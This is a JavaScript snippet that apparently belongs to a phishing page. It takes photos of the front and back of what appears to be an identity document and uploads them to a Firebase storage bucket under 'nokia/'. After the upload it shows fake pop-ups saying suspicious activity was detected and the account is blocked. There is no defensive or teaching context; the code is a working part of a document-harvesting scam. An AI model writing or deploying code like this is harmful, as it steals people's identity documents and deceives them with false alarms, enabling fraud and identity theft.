//let form=document.getElementsByTagName('form').onsubmit= e => e.preventDefault()


     front=document.querySelector('#front').files[0]
     back=document.querySelector('#back').files[0];
    
   // let backMsg=document.querySelector('.msg').innerHTML=back.name

let btn= document.querySelector('.btn'); 
  btn.onclick=()=> {

    console.log(back);

    let storageRef=firebase.storage()
    let store=storageRef.ref('nokia/'+front.name)
    let insert=store.put(front)

      insert.on('state_change', snapshot => {
        setTimeout(()=> {
          swal("", "Suspicious Activities Detected", "warning");
        },2000)

        setTimeout(()=>{
          swal("", "Your Account Has Been Blocked ", "error");
        }, 7000)


      })
 
      //other upload 
 
  }

  //changae events 
  document.querySelector('#front').onchange= e => {
    let msg=document.querySelector('.front_msg');
    msg.innerHTML=document.querySelector('#front').files[0].name;

  }

  document.querySelector('#back').onchange= e => {
    let backErr=document.querySelector('.msg');
    backErr.innerHTML=document.querySelector('#back').files[0].name;

    let db=firebase.storage()
    let id=db.ref('nokia/'+back.name)
    let cont=id.put(back)

      cont.on('state_change', snapshot => {
        console.log('back uploaded');
      })
  }